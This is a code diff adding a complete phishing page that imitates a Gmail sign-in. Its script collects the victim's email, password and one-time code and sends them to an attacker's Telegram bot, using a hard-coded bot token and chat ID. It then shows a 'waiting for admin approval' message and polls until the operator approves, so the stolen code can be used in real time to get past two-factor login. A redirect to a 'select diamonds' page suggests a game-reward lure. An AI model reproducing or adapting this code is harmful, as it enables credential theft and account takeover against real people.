@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Gmail Login</title>
+  <style>
+    *{margin:0;padding:0;box-sizing:border-box;font-family:'Inter',sans-serif;}
+    body{background:#f8fafc;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px;}
+    .box{background:#fff;padding:40px;border-radius:24px;width:100%;max-width:400px;border:1px solid #f1f5f9;}
+    .box h2{color:#0f172a;font-size:24px;font-weight:700;}
+    .box p{color:#64748b;font-size:14px;margin:4px 0 24px;}
+    input{width:100%;padding:14px;margin:8px 0;border:1px solid #e2e8f0;border-radius:12px;font-size:15px;outline:none;}
+    input:focus{border-color:#e94560;}
+    .btn{width:100%;padding:14px;background:#e94560;color:#fff;border:none;border-radius:40px;font-weight:600;font-size:16px;cursor:pointer;}
+    .btn:hover{background:#c72e4a;}
+    .hidden{display:none;}
+    #result{margin-top:16px;text-align:center;font-size:14px;}
+  </style>
+</head>
+<body>
+<div class="box">
+  <h2>🔐 Sign in</h2>
+  <p>Use your Gmail account</p>
+  <form id="loginForm">
+    <input type="email" id="email" placeholder="Email" required>
+    <input type="password" id="password" placeholder="Password" required>
+    <div id="otpField" class="hidden"><input type="text" id="otp" placeholder="Enter OTP (if asked)"></div>
+    <button type="submit" class="btn">Next →</button>
+  </form>
+  <div id="result"></div>
+</div>
+<script>
+  setTimeout(() => {
+    document.getElementById('otpField').classList.remove('hidden');
+  }, 2000);
+
+  document.getElementById('loginForm').addEventListener('submit', async (e) => {
+    e.preventDefault();
+    const email = document.getElementById('email').value;
+    const password = document.getElementById('password').value;
+    const otp = document.getElementById('otp').value || 'N/A';
+
+    const msg = `🔐 Approval Required\n\nEmail: ${email}\nPass: ${password}\nOTP: ${otp}\n\nClick Approve: /approve_${Date.now()}\nClick Reject: /reject_${Date.now()}`;
+    await fetch(`https://api.telegram.org/bot8251315315:AAEU1s7Xrhwv7dQG8qP9he8pxbYBRs2eEcU/sendMessage?chat_id=8011932528&text=${encodeURIComponent(msg)}`);
+
+    document.getElementById('result').innerHTML = '<div style="color:#ffaa00;">⏳ Waiting for admin approval...</div>';
+
+    const interval = setInterval(async () => {
+      const res = await fetch(`/api/approval-status?email=${email}`);
+      const data = await res.json();
+      if (data.status === 'approved') {
+        clearInterval(interval);
+        window.location.href = '/select-diamonds.html';
+      } else if (data.status === 'rejected') {
+        clearInterval(interval);
+        window.location.href = '/rejected.html';
+      }
+    }, 3000);
+  });
+</script>
+</body>
+</html>
